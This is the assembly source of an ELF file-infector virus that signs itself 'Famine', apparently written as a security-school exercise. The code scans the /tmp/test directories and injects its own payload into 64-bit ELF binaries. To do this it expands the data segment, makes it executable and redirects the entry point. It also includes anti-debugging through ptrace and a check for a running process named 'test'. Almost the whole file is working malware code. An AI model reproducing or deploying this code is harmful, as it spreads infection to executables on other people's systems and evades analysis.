%include "asm/header.s"

section .text
global _start

_start:
	PUSHAQ
	jmp main

memcpy:
	enter 0, 0
	mov rcx, rdx
	cld
	rep movsb
	leave
	ret

memset:
	enter 0, 0
	mov rax, rsi
	mov rcx, rdx
	cld
	rep stosb
	leave
	ret

strcmp:
	enter 0, 0
	push r8
	dec rsi
	dec rdi
	strcmp_while:
		inc rdi
		inc rsi
		mov r8b, byte[rdi]
		cmp r8b, 0
		je end_strcmp_while
		cmp r8b, byte[rsi]
		je strcmp_while
	end_strcmp_while:
	xor rax, rax
	mov al, byte[rdi]
	sub al, byte[rsi]
	pop r8
	leave
	ret

strcat:
	enter 0, 0
	push r8
	push rdi
	call strlen
	pop rdi
	add rdi, rax
	dec rsi
	strcat_while:
		inc rsi
		mov r8b, byte[rsi]
		mov byte[rdi], r8b
		inc rdi
		cmp byte[rsi], 0
		jne strcat_while
	mov byte[rdi], 0
	pop r8
	leave
	ret

strlen:
	enter 0, 0
	push rsi
	mov rax, 0
	mov rsi, rdi
	dec rsi
	strlen_while:
		inc rsi
		cmp byte[rsi], 0
		jne strlen_while
	sub rsi, rdi
	mov rax, rsi
	pop rsi
	leave
	ret

puts:
	enter 0, 0
	push r8
	push rcx
	push rdi
	call strlen
	pop rsi
	mov r8b, byte[rsi + rax - 1]
	xor rdi, rdi
	mov rdx, rax
	mov rax, sys_write
	syscall
	padding
	cmp r8b, 0xa
	je end_puts
	mov rdi, 0
	lea rsi, [rel new_line]
	mov rdx, 1
	mov rax, sys_write
	syscall
	end_puts:
	pop rcx
	pop r8
	leave
	ret

check_addr:		;	rdi:elf_struc  rsi:addr
	enter 0, 0
	push r13
	mov r13, QWORD[rdi + elf_struc.ptr_end]
	mov rdi, QWORD[rdi + elf_struc.ptr]
	cmp rsi, rdi
	jl check_addr_ret_0
	cmp rsi, r13
	jg check_addr_ret_0
	mov rax, 1
	jmp check_addr_ret
	check_addr_ret_0:
	mov rax, 0
	check_addr_ret:
	pop r13
	leave
	ret

check_str_in_addr:	; rdi:elf_struc rsi:str
	enter 0, 0
	chk_one_byte:
	push rdi
	push rsi
	call check_addr
	pop rsi
	pop rdi
	cmp rax, 0
	je ret_0
	mov al, BYTE[rsi]
	inc rsi
	cmp al, 0
	jne chk_one_byte
	mov rax, 1
	leave
	ret

modify_sections:
	enter 0, 0
	mov r8, rdi									;r8 contient elf_struc
	mov r9, QWORD[r8 + elf_struc.ehdr]			;r9 contient ehdr
	xor r10, r10
	mov r10, QWORD[r9 + ehdr.e_shoff]
	add r10, r9									;r10 contient les shdr

	mov r11, QWORD[r8 + elf_struc.data_phdr]
	mov r12, QWORD[r11 + phdr.p_offset]
	add r12, QWORD[r11 + phdr.p_filesz]
	mov r11, r12								;r11 contient l'addr ou le code sera inséré
	xor rcx, rcx
	mov cx, WORD[r9 + ehdr.e_shnum]
	xor rbx, rbx
	dec rbx
	while_shdr_to_modify:
		inc rbx
		cmp rbx, rcx
		je end_while_data_shdr
		mov rax, SHDR_SIZE
		mul rbx
		lea rdi, [r10 + rax]	; rdi: current shdr

		xor rdx, rdx
		mov edx, DWORD[rdi + shdr.sh_name]
		mov rsi, QWORD[r8 + elf_struc.shdr_names]
		add rsi, rdx			;rsi has the sct name sct name

		push rdi
		lea rdi, [rel bss_name]
		call strcmp
		pop rdi
		cmp rax, 0
		je while_shdr_to_modify ; if not bss section
		mov rax, QWORD[rdi + shdr.sh_offset]
		cmp rax, r11
		jl while_shdr_to_modify ; if shdr.offset >= dataphdr.offset + dataphdr.filesz
			mov rax, QWORD[r8 + elf_struc.bits_added]
			add QWORD[rdi + shdr.sh_offset], rax
			mov rax, QWORD[rdi + shdr.sh_addr]
			cmp rax, 0
			je while_shdr_to_modify
				mov rax, QWORD[r8 + elf_struc.bits_added]
				add QWORD[rdi + shdr.sh_addr], rax
		jmp while_shdr_to_modify
	end_while_shdr_to_modify:
	mov rax, 1
	leave
	ret

modify_segements:
	enter 0, 0
	mov r8, rdi									;r8 contient elf_struc
	mov r9, QWORD[r8 + elf_struc.ehdr]			;r9 contient ehdr
	xor r10, r10
	mov r10, QWORD[r9 + ehdr.e_phoff]
	add r10, r9									;r10 contient les phdr
	mov QWORD[r8 + elf_struc.data_phdr], 0

	mov rdi, r8
	mov rsi, r10
	call check_addr								;check phoff addr
	cmp rax, 0
		je ret_0

	xor rcx, rcx
	mov cx, WORD[r9 + ehdr.e_phnum]
	mov rax, PHDR_SIZE
	mul rcx
	lea rsi, [r10 + rax]
	mov rdi, r8
	call check_addr
	cmp rax, 0
		je ret_0								;check all phdr

	xor rcx, rcx
	mov cx, WORD[r9 + ehdr.e_phnum]
	xor rbx, rbx
	dec rbx
	while_data_phdr:
		inc rbx
		cmp rbx, rcx
		je end_while_data_shdr
		mov rax, PHDR_SIZE
		mul rbx
		lea rdi, [r10 + rax]	; rdi: current phdr

		mov eax, DWORD[rdi + phdr.p_type]
		cmp eax, 1
		jne end_if_data_phdr1
		mov r11, QWORD[rdi + phdr.p_offset]
		mov r12, QWORD[r8 + elf_struc.data_shdr]
		mov r12, QWORD[r12 + shdr.sh_offset]
		cmp r11, r12
		jg end_if_data_phdr1
		add r11, QWORD[rdi + phdr.p_filesz]
		cmp r11, r12
		jl end_if_data_phdr1						; if phdr is data phdr
			mov DWORD[rdi + phdr.p_flags], 7
			mov QWORD[r8 + elf_struc.data_phdr], rdi ; data_phdr = phdr;
			mov rax, QWORD[rdi + phdr.p_vaddr]
			add rax, QWORD[rdi + phdr.p_memsz]
			mov QWORD[r8 + elf_struc.new_entry], rax ; new_entry = phdr->p_vaddr + phdr->p_memsz;
			mov rax, QWORD[rdi + phdr.p_memsz]
			sub rax, QWORD[rdi + phdr.p_filesz]
			mov QWORD[r8 + elf_struc.bss_size], rax ; bss_size = phdr->p_memsz - phdr->p_filesz;
			add	QWORD[r8 + elf_struc.bits_added], rax ; bits_added += bss_size;
			mov rax, QWORD[rdi + phdr.p_offset]
			add rax, QWORD[rdi + phdr.p_filesz]
			mov QWORD[r8 + elf_struc.new_code_offset], rax ; new_code_offset = phdr->p_offset + phdr->p_filesz;
			jmp while_data_phdr
		end_if_data_phdr1:
		mov rax, QWORD[r8 + elf_struc.data_phdr]
		cmp rax, 0
		je end_if_data_phdr2
		mov r11, QWORD[rax + phdr.p_offset]
		add r11, QWORD[rax + phdr.p_filesz]
		mov rax, QWORD[rdi + phdr.p_offset]
		cmp rax, r11
		jl end_if_data_phdr2
			mov rax, QWORD[r8 + elf_struc.bits_added]
			add QWORD[rdi + phdr.p_offset], rax
			mov rax, QWORD[rdi + phdr.p_vaddr]
			cmp rax, 0
			jmp end_if_data_phdr2
			mov rax, QWORD[r8 + elf_struc.bits_added]
			add QWORD[rdi + phdr.p_vaddr], rax
			add QWORD[rdi + phdr.p_paddr], rax
		end_if_data_phdr2:
		jmp while_data_phdr
	end_while_data_phdr:
	mov rax, QWORD[r8 + elf_struc.data_phdr]
	leave
	ret

fill_data_sec:
	enter 0, 0
	mov r8, rdi									;r8 contient elf_struc
	mov r9, QWORD[r8 + elf_struc.ehdr]			;r9 contient ehdr
	xor r10, r10
	mov r10, QWORD[r9 + ehdr.e_shoff]
	add r10, r9									;r10 contient les shdr
	mov QWORD[r8 + elf_struc.data_shdr], 0

	mov rsi, r10
	mov rdi, r8
	call check_addr
	cmp rax, 0
		je ret_0

	xor rcx, rcx
	mov cx, WORD[r9 + ehdr.e_shnum]
	mov rax, SHDR_SIZE
	mul rcx

	lea rsi, [r10 + rax]
	mov rdi, r8
	call check_addr
	cmp rax, 0
		je ret_0
	; all sections are tested

	xor rcx, rcx
	mov bx, WORD[r9 + ehdr.e_shnum]
	mov cx, WORD[r9 + ehdr.e_shstrndx]
	cmp cx, bx
		jge ret_0
	mov rax, SHDR_SIZE
	mul rcx
	lea rax, [r10 + rax]
	mov rsi, [rax + shdr.sh_offset]
	lea rsi, [r9 + rsi]
	mov QWORD[r8 + elf_struc.shdr_names], rsi
	mov rdi, r8
	call check_addr
	cmp rax, 0
		je ret_0

	xor rcx, rcx
	mov cx, WORD[r9 + ehdr.e_shnum]
	xor rbx, rbx
	dec rbx
	while_data_shdr:
		inc rbx
		cmp rbx, rcx
		je end_while_data_shdr
		mov rax, SHDR_SIZE
		mul rbx
		lea rdi, [r10 + rax]	; rdi: current shdr
		push rdi

		xor rdx, rdx
		mov edx, DWORD[rdi + shdr.sh_name]
		mov rsi, QWORD[r8 + elf_struc.shdr_names]
		add rsi, rdx
		push rsi
		mov rdi, r8
		call check_str_in_addr	; check if str has good addresses
		pop rdi
		cmp rax, 0
		je end_while_data_shdr
		
		lea rsi, [rel data_name]
		call strcmp
		cmp rax, 0
		pop rdi
		jne while_data_shdr
		mov QWORD[r8 + elf_struc.data_shdr], rdi
		jmp while_data_shdr
	end_while_data_shdr:

	mov rax, QWORD[r8 + elf_struc.data_shdr]
	leave
	ret

rewrite_binary:
	enter 0, 0
	mov r11, rdi	;r11 contient elf_struc
	mov rsi, QWORD[r11 + elf_struc.stat + stat.st_size]
	add rsi, QWORD[r11 + elf_struc.bits_added]
	sub rsp, rsi	; nique sa mere mmap n'avait qu'a marcher
	mov QWORD[r11 + elf_struc.new_bin_addr], rsp

	mov rbx, QWORD[r11 + elf_struc.bits_added]
	mov rax, QWORD[r11 + elf_struc.ehdr]
	add QWORD[rax + ehdr.e_shoff], rbx			;e_shoff += bits_added
	
	mov rax, QWORD[r11 + elf_struc.ehdr]
	mov rbx, QWORD[r11 + elf_struc.new_entry]
	mov QWORD[rax + ehdr.e_entry], rbx			;e_entry = new_entry

	mov rax, QWORD[r11 + elf_struc.data_phdr]
	mov rbx, QWORD[r11 + elf_struc.bits_added]
	add QWORD[rax + phdr.p_filesz], rbx			;dataphdr.p_filesz += bits_added

	mov rbx, QWORD[rax + phdr.p_filesz]
	mov QWORD[rax + phdr.p_memsz], rbx			;dataphdr.p_memsz = p_filesz

	mov r13, 0									;bits written
	mov rdi, QWORD[r11 + elf_struc.new_bin_addr]
	mov rsi, QWORD[r11 + elf_struc.ptr]
	mov rdx, QWORD[r11 + elf_struc.new_code_offset]
	call memcpy											;copie du debut du bin
	add r13, QWORD[r11 + elf_struc.new_code_offset]

	mov rdi, QWORD[r11 + elf_struc.new_bin_addr]
	add rdi, r13
	mov rsi, 0
	mov rdx, QWORD[r11 + elf_struc.bss_size]
	call memset											;copie de la bss
	add r13, QWORD[r11 + elf_struc.bss_size]

	mov rdi, QWORD[r11 + elf_struc.new_bin_addr]
	add rdi, r13
	lea rsi, [rel _start]
	mov rdx, PAYLOAD_SIZE
	call memcpy											;copie du payload
	add r13, PAYLOAD_SIZE

	lea rbx, [rel jmp_old_entry]
	lea rax, [rel end]
	sub rax, rbx
	sub rax, 2
	mov rdi, QWORD[r11 + elf_struc.new_bin_addr]
	add rdi, r13
	sub rdi, rax								; addr to jump on old entry
	mov rax, QWORD[r11 + elf_struc.new_entry]
	sub rax, QWORD[r11 + elf_struc.old_entry]
	mov QWORD[rdi], rax


	mov rdi, QWORD[r11 + elf_struc.new_bin_addr]
	add rdi, r13

	mov rsi, QWORD[r11 + elf_struc.ehdr]
	add rsi, QWORD[r11 + elf_struc.new_code_offset]

	mov rdx, QWORD[r11 + elf_struc.stat + stat.st_size]
	sub rdx, QWORD[r11 + elf_struc.new_code_offset]

	add r13, rdx
	call memcpy									;copi la fin du bin

	mov rdi, QWORD[r11 + elf_struc.path]
	mov rsi, 513
	mov rax, sys_open
	push r11
	syscall
	padding
	pop r11
	mov QWORD[r11 + elf_struc.fd2], rax
	cmp rax, 0
	jl ret_0					; open the good file

	mov rdi, rax
	mov rsi, QWORD[r11 + elf_struc.new_bin_addr]
	mov rdx, r13
	mov rax, sys_write
	push r11
	syscall
	padding
	pop r11

	mov rdi, QWORD[r11 + elf_struc.fd2]
	mov rax, sys_close
	syscall
	padding

	jmp ret_1

infect_elf:		; r8:elf_struc
	enter 0, 0
	mov r8, rdi
	mov rax, QWORD[r8 + elf_struc.stat + stat.st_size]
	cmp rax, 64								; test if ehdr is in the file
	jl infect_elf_end
	mov rdi, QWORD[r8 + elf_struc.ptr]
	mov QWORD[r8 + elf_struc.ehdr], rdi
	mov rsi, QWORD[r8 + elf_struc.stat + stat.st_size]
	add rdi, rsi
	mov QWORD[r8 + elf_struc.ptr_end], rdi  ; fill ptr_end

	mov rdi, QWORD[r8 + elf_struc.ehdr]
	mov edi, DWORD[rdi + ehdr.ei_mag]
	cmp edi, 0x464c457f
	jne infect_elf_end						; check magic number

	mov rdi, QWORD[r8 + elf_struc.ehdr]
	mov sil, BYTE[rdi + ehdr.ei_class]
	cmp sil, 2								; check 64 bits
	jne infect_elf_end

	mov si, WORD[rdi + ehdr.e_type]
	cmp si, 2
	je continue_infection
	cmp si, 3								; check elf type
	je continue_infection
	jmp infect_elf_end

	continue_infection:
	mov QWORD[r8 + elf_struc.bits_added], PAYLOAD_SIZE		; bits_added = sizeof(payload)
	mov rax, QWORD[r8 + elf_struc.ehdr]
	mov rax, QWORD[rax + ehdr.e_entry]
	mov QWORD[r8 + elf_struc.old_entry], rax				; old_entry = sizeof(payload)
	mov rdi, r8
	call fill_data_sec
	cmp rax, 0
	je infect_elf_end

	mov rdi, r8
	call modify_segements
	cmp rax, 0
	je infect_elf_end

	mov rdi, QWORD[r8 + elf_struc.data_phdr]
	mov rsi, QWORD[rdi + phdr.p_offset]
	add rsi, QWORD[rdi + phdr.p_filesz]
	mov rdi, QWORD[r8 + elf_struc.ptr]
	add rdi, rsi
	mov rsi, end - signature
	sub rdi, rsi
	lea rsi, [rel signature]
	call strcmp							;test if infected
	cmp rax, 0
	je infect_elf_end


	mov rdi, r8
	call modify_sections

	mov rdi, r8
	push r8
	call rewrite_binary
	pop r8
	cmp rax, 0
	je infect_elf_end

	mov rdi, QWORD[r8 + elf_struc.path]
	call puts

	infect_elf_end:
	leave
	ret

process_file:
	enter 0, 0
	sub rsp, ELF_STRUC_SIZE
	mov QWORD[rsp + elf_struc.path], rdi

	mov rax, sys_lstat
	lea rsi, [rsp + elf_struc.stat]
	syscall
	padding
	cmp rax, 0
	jl process_file_end

	mov eax, DWORD [rsp + elf_struc.stat + stat.st_mode]
	and eax, TYPE_MASK
	cmp eax, DIRECTORY_MODE
	jne not_a_directory
		mov rdi, QWORD[rsp + elf_struc.path]
		call strlen
		mov rdi, QWORD[rsp + elf_struc.path]
		mov byte[rdi + rax], 0x2f
		mov byte[rdi + rax + 1], 0
		lea rsi, [rel process_file]
		call process_dir
		jmp process_file_end
	not_a_directory:
	mov eax, DWORD [rsp + elf_struc.stat + stat.st_mode]
	and eax, TYPE_MASK
	cmp eax, FILE_MODE
	jne process_file_end

	mov rdi, QWORD[rsp + elf_struc.path]
	mov rsi, OPEN_FILE_PERMISSION
	mov rax, sys_open
	syscall						; opening the file
	padding
	mov QWORD[rsp + elf_struc.fd], rax
	cmp rax, 0
	jl process_file_end
	mov rax, QWORD[rsp + elf_struc.stat + stat.st_size]
	cmp rax, 0
	jle close_file

	mov rdi, 0
	mov rsi, QWORD[rsp + elf_struc.stat + stat.st_size]
	mov rdx, MMAP_PROT
	mov r10, MAP_PRIVATE
	xor r8, r8
	mov r8, QWORD[rsp + elf_struc.fd]
	mov r9, 0
	mov rax, sys_mmap
	syscall						;mmap the file
	padding
	mov QWORD[rsp + elf_struc.ptr], rax
	cmp rax, 0
	jl close_file
	;infect routine

	mov rdi, rsp
	call infect_elf

	;end of infect routine
	mov rdi, QWORD[rsp + elf_struc.ptr]
	xor rsi, rsi
	mov esi, DWORD[rsp + elf_struc.stat + stat.st_size]
	mov rax, sys_munmap			;munmap the file
	syscall
	padding

	close_file:
	mov edi, DWORD[rsp + elf_struc.fd]
	mov rax, sys_close
	syscall
	padding
	process_file_end:
	mov rax, 0
	leave
	ret

check_proc:
	enter 0, 0
	sub rsp, NAME_SIZE + CONTENT_SIZE

	mov r8, rdi
	lea rdi, [rbp - NAME_SIZE]
	mov byte[rdi], 0
	mov rsi, r8
	call strcat
	lea rdi, [rbp - NAME_SIZE]
	lea rsi, [rel proc_name_file]
	call strcat

	lea rdi, [rbp - NAME_SIZE]
	mov rsi, OPEN_PROC_PERMISSION
	mov rax, sys_open
	syscall			;open the proc file
	padding
	mov r10, rax
	cmp rax, 0
	jl proc_ret_0

	mov rdi, rax
	lea rsi, [rsp]
	mov rdx, CONTENT_SIZE
	mov rax, sys_read
	syscall			;read the proc file
	padding
	mov byte[rsp + rax], 0
	cmp rax, 0
	jl proc_ret_0

	mov rax, sys_close
	mov rdi, r10
	syscall			;close the proc file
	padding

	lea rdi, [rsp]
	lea rsi, [rel proc_ban]
	call strcmp
	cmp rax, 0
	jne proc_ret_0

	mov rax, 1
	jmp proc_end
	proc_ret_0:
	mov rax, 0
	proc_end:
	leave
	ret

process_dir:			;  r12:fd   r13:folder   r9:getends ret    r8:buffer   r10:function pointer		r11:ret value
	enter 0, 0
	sub rsp, DIRENT_SIZE + NAME_SIZE
	mov r13, rdi
	mov r10, rsi
	mov rax, sys_open
	mov rsi, OPEN_DIR_PERMISSION
	xor rdx, rdx
	syscall							; it opens the dir
	padding
	mov r12, rax
	cmp rax, 0
	jl end_process_dir
	read_dirent:
		mov rdi, r12
		lea rsi, [rsp]
		mov rdx, DIRENT_SIZE
		mov rax, sys_getdents
		syscall						; it reads dir entries
		padding

		cmp rax, 0
		jle close_dir
		mov r9, rax
		add r9, rsp
		mov rcx, rsp
		file_listing:
			lea rdi, [rcx + linux_dirent.d_name]
			lea rsi, [rel dot]
			call strcmp
			cmp rax, 0
			je end_if_not_dot
			lea rdi, [rcx + linux_dirent.d_name]
			lea rsi, [rel ddot]
			call strcmp
			cmp rax, 0
			je end_if_not_dot
			;if entry not a dot or double dot
				lea rdi, [rbp - NAME_SIZE]
				mov byte[rdi], 0
				lea rsi, [r13]
				call strcat
				lea rdi, [rbp - NAME_SIZE]
				lea rsi, [rcx + linux_dirent.d_name]
				call strcat

				lea rdi, [rbp - NAME_SIZE]
				push r10
				push r11
				push rcx
				push r9
				push r12
				push r13
				call r10
				pop r13
				pop r12
				pop r9
				pop rcx
				pop r11
				pop r10
				cmp rax, 1
				mov r11, 1
				je close_dir
				mov r11, 0
			end_if_not_dot:

			xor r8, r8
			mov r8w, WORD [rcx + linux_dirent.d_reclen]
			add rcx, r8
			cmp rcx, r9
			jl file_listing
		jmp read_dirent
	close_dir:
	push r11
	mov rax, sys_close
	mov rdi, r12
	syscall
	pop r11
	end_process_dir:
	mov rax, r11
	leave
	ret

check_debugger:
	enter 0, 0
	mov rax, sys_ptrace
	mov rdi, 0
	syscall
	cmp rax, 0
	jl ret_1_debugger
	mov rdi, 17
	mov rsi, 0
	mov r10, 0
	syscall
	mov rax, 0
	jmp end_check_debugger
	ret_1_debugger:
	mov rax, 1
	end_check_debugger:
	leave
	ret

main:
	call check_debugger
	cmp rax, 1
	je jmp_old_entry
	lea rdi, [rel proc_dir]
	lea rsi, [rel check_proc]
	call process_dir
	cmp rax, 1
	je jmp_old_entry
	lea rdi, [rel dir1]
	lea rsi, [rel process_file]
	call process_dir
	lea rdi, [rel dir2]
	lea rsi, [rel process_file]
	call process_dir
	jmp jmp_old_entry

ret_0:
	mov rax, 0
	leave
	ret

ret_1:
	mov rax, 1
	leave
	ret

jmp_old_entry:
	mov rdi, 0x1111111111111111
	mov rsi, 0x1111111111111111
	cmp rdi, rsi
	jne the_jump							; exit if real famine
		mov rax, 60
		xor rdi, rdi
	syscall
	the_jump:
	lea rax, [rel _start]
	sub rax, rdi
	POPAQ
	jmp rax

dir1:
	db '/tmp/test/', 0
dir2:
	db '/tmp/test2/', 0
proc_dir:
	db '/proc/', 0
proc_name_file:
	db '/comm', 0
proc_ban:
	db 'test', 0xa, 0
new_line:
	db 0x0a, 0
dot:
	db ".", 0
ddot:
	db "..", 0
data_name:
	db ".data", 0
bss_name:
	db ".bss", 0
signature:
	db 'Famine version 1.0 (c)oded by gdelabro', 0
dqdqw:
	db 'a'
end: